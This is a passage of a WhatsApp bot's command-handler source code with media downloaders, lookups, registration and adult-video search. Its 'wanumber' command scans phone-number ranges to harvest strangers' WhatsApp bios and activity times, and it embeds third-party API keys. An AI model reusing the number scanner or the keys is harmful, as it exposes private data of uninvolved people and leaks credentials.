replygcyuta(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcyuta(`Enter the Google Drive link`)
	replygcyuta(mess.loading)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcyuta(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	Yuta.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcyuta('Error: Check link or try another link') 
  }
}
break
           case 'git': case 'gitclone':
if (!args[0]) return replygcyuta(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Yuta-Okkotsu/YutaMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcyuta(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Yuta.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcyuta(mess.error))
break
case 'spotify': case 'spotifysearch': case 'spotifys':  {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
replygcyuta(mess.loading)
if (!text) return replygcyuta('Masukan judul lagu!')
const { SearchSpotify } = require('./lib/spotify')
let hasil = await SearchSpotify(text)
let caption = hasil.data.map((v, i) => {
return {
header: "",
title: v.title,
description: `Link: ${v.url}`,
id: `${xprefix}splay ` + v.url
}
})
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: {
text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
},
footer: {
text: botname
},
header: {
title: "Spotify - Search",
subtitle: "",
hasMediaAttachment: false,
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "CLICK HERE",
sections: [
{
title: "",
rows: caption
}
]
})
}
]
}
}
}
}
}, { quoted: fnews }, {});
await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
});
}
break
case 'infoanime':
case 'Informationanime':
case 'informasianime': {
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`masukan judul anime? contoh ${prefix + command}atri: my dear moments`)
sendReaction("⏳")
replygcyuta(mess.loading)
if (limituser < 1) return limitAbis();
useLimit(1)

try {
const infoanime = await fetchJson(`https://api.ryzendesu.vip/api/weebs/anime-info?query=${text}`)
let capt = `┏⪻── *[ ɪ ɴ ғ ᴏ - ᴀ ɴ ɪ ᴍ ᴇ ]* ──⪼┓\n`
capt += `〆  ᴊᴜᴅᴜʟ : ${infoanime.title}\n`
capt += `〆  sᴄᴏʀᴇ : ${infoanime.score}\n`
capt += `〆  ᴍᴇᴍʙᴇʀs : ${infoanime.members}\n`
capt += `〆  sᴛᴀᴛᴜs : ${infoanime.status}\n`
capt += `〆  ᴅᴇsᴄʀɪᴘᴛɪᴏɴ : ${infoanime.synopsis}\n`
capt += `〆  ғᴀᴠᴏʀɪᴛᴇ : ${infoanime.favorites}\n`
capt += `〆  ᴜʀʟ : ${infoanime.url}\n`
capt += `┗⪻─────────────────────────⪼┛`
let buttonnya = [{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Url InfoAnime',
url: infoanime.url,
 merchant_url: infoanime.url
}
}]
await Yuta.sendButtonImg(m.chat, capt, botname, null, infoanime.images.jpg.large_image_url, buttonnya, fnews, saluran, `InfoAnime By: ${ownername}`);
} catch (err) {
sendReaction("❌")
}}
break

replygcyuta(mess.loading)
case 'splay': case 'spotifydl': {
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
const { SpotifyDown, spotify, SearchSpotify } = require('./lib/spotify')
if (!text.includes('open.spotify.com')) return replygcyuta('link Spotify?!')
await LoadingReact()
let songd = await spotify(text)
const { title, track, artis, durasi, image, download } = await spotify(text);
let g = new SpotifyDown()
let hasil = await g.downloadTrack(text)
let metadatahasil = await g.metadata(text)
let songa = metadatahasil.apiResponse.data[0]

let anuu = `
∘ Judul: ${songd.title}
∘ Artis: ${songd.author}
∘ Link: ${songd.link}
∘ Tanggal Rilis Song: ${songa.releaseDate}

\`Tunggu buat ngirim lagunya...\``
const p = await new canvafy.Spotify()
  .setTitle(songd.title)
  .setAuthor("Spotify Downloader")
  .setTimestamp(40, 100)
  .setOverlayOpacity(0.8)
  .setBorder("#fff", 0.8)
  .setImage(songd.thumbnail)
  .setBlur(3)
  .build();

await Yuta.sendMessage(from, { image: p, caption: anuu }, { quoted: fnews })
try {
let leo = {
    audio: {
      url: songd.music
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: text,
        title: songd.title,
        body: songd.author,
        sourceUrl: text,
        thumbnailUrl: songd.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
} catch (e) {
replygcyuta(`${e}`)
try {
let leo = {
    audio: {
      url: hasil.file_url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: text,
        title: songd.title,
        body: songd.author,
        sourceUrl: text,
        thumbnailUrl: songd.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
} catch (e) {
replygcyuta(`${e}`)
}}

}
break

case 'spotifyvn': {
if (!users.registered) return IsReg() 
if (!text.includes('open.spotify.com')) return replygcyuta('link Spotify?!')
const { SpotifyDown, spotify, SearchSpotify } = require('./lib/spotify')
await LoadingReact()
let songd = await spotify(text)
const { title, track, artis, durasi, image, download } = await spotify(text);
let g = new SpotifyDown()
let hasil = await g.downloadTrack(text)
let metadatahasil = await g.metadata(text)
let songa = metadatahasil.apiResponse.data[0]

try {
let leo = {
    audio: {
      url: songd.music
    },
    mimetype:'audio/mpeg',
    ptt: true,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: text,
        title: songd.title,
        body: songd.author,
        sourceUrl: text,
        thumbnailUrl: songd.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
} catch (e) {
replygcyuta(`${e}`)
}

}
break



case 'mediafire': case 'mf': {
if (!users.registered) return IsReg() 
if (!text.includes('mediafire.com')) return replygcyuta(`• *Example :* .${command} https://www.mediafire.com/file/xxxxxxx/`)

async function mf(url) {
    return new Promise(async (resolve, reject) => {
        try {
            const response = await require("undici").fetch(url);
            const data = await response.text();
            const $ = cheerio.load(data);
            
            let name = $('.dl-info > div > div.filename').text();
            let link = $('#downloadButton').attr('href');
          let det = $('ul.details').html().replace(/\s/g, "").replace(/<\/li><li>/g, '\n').replace(/<\/?li>|<\/?span>/g, '');
            let type = $('.dl-info > div > div.filetype').text();

        

            const hasil = {
                filename: name,
                filetype: type,
                link: link,
                detail: det
            };

            resolve(hasil);
        } catch (err) {
            console.error(err);
            reject(err);
        }
    });
}

const sendReaction = async reactionContent => {
  Yuta.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

try {
let { filename, filetype, link, detail } = await mf(text)
let mfcap = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - ᴍ ғ ]* ──⪼┓`
mfcap += `〆 ɴᴀᴍᴀ : ${filename}\n`
mfcap += `〆 ᴛʏᴘᴇ : ${filetype}\n`
mfcap += `〆 ᴅᴇᴛᴀɪʟ : ${detail}\n`
mfcap += `〆 ᴜʀʟ : ${text}\n`
mfcap += `┗⪻─────────────────────────⪼┛`

await Yuta.sendMessage(m.chat, {document: {url:link}, mimetype: link, fileName: filename, caption: mfcap }, {quoted:m});
} catch (err) {
try {
sendReaction("⏳")
const akira = await fetchJson(`https://api.botwa.space/api/mediafire?url=${text}&apikey=90x5sFRa1Xlc`)
let { filename, filesize, uploadAt, link } = akira.result
var result = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - ᴍ ғ ]* ──⪼┓
〆 ɴᴀᴍᴀ : ${filename}
〆 sɪᴢᴇ : ${filesize}
〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${uploadAt}
〆 ᴜʀʟ : ${text}
┗⪻─────────────────────────⪼┛`;
sendReaction("✅")
await Yuta.sendMessage(m.chat, {document: {url:akira.result.link}, mimetype: akira.result.link, fileName: filename, caption: result}, {quoted:m});
} catch (err) {
 sendReaction("❌")
}}}
break



case 'daftar': {
  let Reg = /\|?(.*)([.|] *?)([0-9]*)$/i
  let teks = text
  let user = global.db.data.users[m.sender]    
  if (users.registered) {
    return replygcyuta("```ᴋᴀᴍᴜ sᴜᴅᴀʜ ᴛᴇʀᴅᴀғᴛᴀʀ ✓```")
  } else {
    let match = teks.match(Reg)
    if (!match) return replygcyuta('*[ sʏsᴛᴇᴍ ]* ғᴏʀᴍᴀᴛ ᴘᴇɴᴅᴀғᴛᴀʀᴀɴ ᴛɪᴅᴀᴋ sᴇsᴜᴀɪ. ᴘᴀsᴛɪᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴇɴᴜʟɪs ɴᴀᴍᴀ ᴅᴀɴ umuʀ ᴅᴇɴɢᴀɢ ʙᴇɴᴀʀ\n\nᴄᴏɴᴛᴏʜ: .ᴅᴀғᴛᴀʀ DitzCode.15')    
    let [name, age] = match
    if (!name.trim()) return reply('Nama Tidak Boleh Kosong')
    if (!age) return reply('Umur Tidak Boleh Kosong')    
    age = parseInt(age)
    if (age > 30) return replygcyuta('*[ sʏsᴛᴇᴍ ]* ᴋᴀᴍᴜ ᴏᴍ ᴏᴍ ʏᴀ ᴋᴏᴋ ᴜᴍᴜʀ ɴʏᴀ ᴛᴜᴀ -_-')
    if (age < 5) return replygcyuta('*[ sʏsᴛᴇᴍ ]* ᴍᴀᴀғ ᴋᴀᴍᴜ ᴛᴇʀʟᴀʟᴜ ʙᴏᴄɪʟ ._.')    
    user.name = name.trim()
    user.age = age
    user.regTime = +new Date
    user.registered = true
    user.sn = generateRandomPassword()    
    let sn = crypto.createHash("md5").update(m.sender).digest("hex")
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.fromMe ? Yuta.user.jid : m.sender
    let capt = `┏⪻── *[ ᴅ ᴀ ғ ᴛ ᴀ ʀ - s ᴜ ᴄ ᴄ ᴇ s s ]* ──⪼┓\n`
    capt += `〆 ɴᴀᴍᴇ : ${name}\n`
    capt += `〆 ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}\n`
    capt += `〆 ɴᴏᴍᴏʀ sᴇʀɪᴀʟ : .ceksn\n`
    capt += `〆 ᴄʀᴇᴀᴛᴇ ʙʏ: DitzCodeᴏxᴢʏ ғɪᴛᴜʀ ᴅᴀғᴛᴀʀ ʙʏ: ᴅɪᴛᴢᴏғғᴄ\n`
    capt += `┗⪻─────────────────────────⪼┛`    
let buttonnya = [{
name: 'single_select',
buttonParamsJson: {
title: 'Click Here',
sections: [{
title: 'Ohayo',
rows: [
{
title: 'Menu',
description: 'Display Menu',
id: '.menu'
},
{
title: 'Allmenu',
description: 'Display Allmenu',
id: '.allmenu' }]}]}
},
{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Group',
url: linkgc,
 merchant_url: linkgc }
},
{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Saluran',
url: linkch,
 merchant_url: linkch
}
}]
await Yuta.sendButtonImgdf(m.chat, capt, botname, null, fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'), buttonnya, fnews, saluran, `Register By; ${ownername}`);
}
}
break
case 'ceksn': {
  if (!users.registered) return IsReg() 
  let sn = users.sn
  let msg = generateWAMessageFromContent(m.sender, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Hai Kak! Ini Kode Serial Number Kamu, Jangan Di Berikan Oleh Siapapun Ya! Demi Keamanan Data Kamu Di Dalam Database Bot :>"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'Your data is safe ✓'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Salin Disini","id":"123456789","copy_code":"${sn}"}`
            }],
          })
        })
      }
    }
  }, {quoted:fnews})
  await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  })
}
break
case 'remini': case 'hd': {
if (!users.registered) return IsReg() 
if (!quoted) return replygcyuta(`Where is the picture?`)
if (!/image/.test(mime)) return replygcyuta(`Send/Reply Photos With Captions ${prefix + command}`)
replygcyuta(mess.loading)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😍\",\"id\":\""}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'imdb':
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`_Name a Series or movie`)
replygcyuta(mess.loading)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           Yuta.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'itunes': {
            if (!users.registered) return replygcyuta("⚠️Anda Belum Daftar Silakan Daftar .daftar");
if (!text) return replygcyuta('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
    } else {
      replygcyuta(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'lyrics': case 'lirik': {
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
replygcyuta(mess.loading)

try {
sendReaction("⏳")
let textt = (text)
const widipe = await fetchJson(`https://widipe.com/lirik?text=${textt}`)
replygcyuta(`${widipe.result.lyrics}`)
sendReaction("✅")
} catch (err) {
try {
const { Lirik } = require('./lib/lyrics')
sendReaction("⏳")
let hasil = await Lirik(text)
sendReaction("✅")
let no = 1
for (let i of hasil.lirik) {
replygcyuta(`📑ᴊᴜᴅᴜʟ: ${hasil.judul}\n💽ᴀʟʙᴜᴍ:${hasil.album}\n 📄ʟɪʀɪᴋ:\n${i}`)
}
} catch (err) {
sendReaction("❌")
}}

}
break
            case 'friend':
case 'searchfriend':{
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
let teman = pickRandom(yutaverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcyuta('Managed to Get One Person')
}, 5000)
setTimeout(() => {
Yuta.sendMessage(m.chat, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
            case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
            if (!users.registered) return IsReg() 
           	if (!text) return replygcyuta(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcyuta(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Yuta.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Yuta.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcyuta(`${text66}${nobio}${nowhatsapp}`)
        }
break
			case 'stickersearch': {
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
			case 'apksearch': {
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    Yuta.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
			case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
    if (!users.registered) return IsReg() 
	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
  if (!text) return replygcyuta(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return replygcyuta('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!\nTitle: ${title}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygcyuta('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Search Results for "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygcyuta('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!users.registered) return IsReg() 
  if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
  if (!text)
    return replygcyuta(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: Yuta.waUploadToServer })
          }),
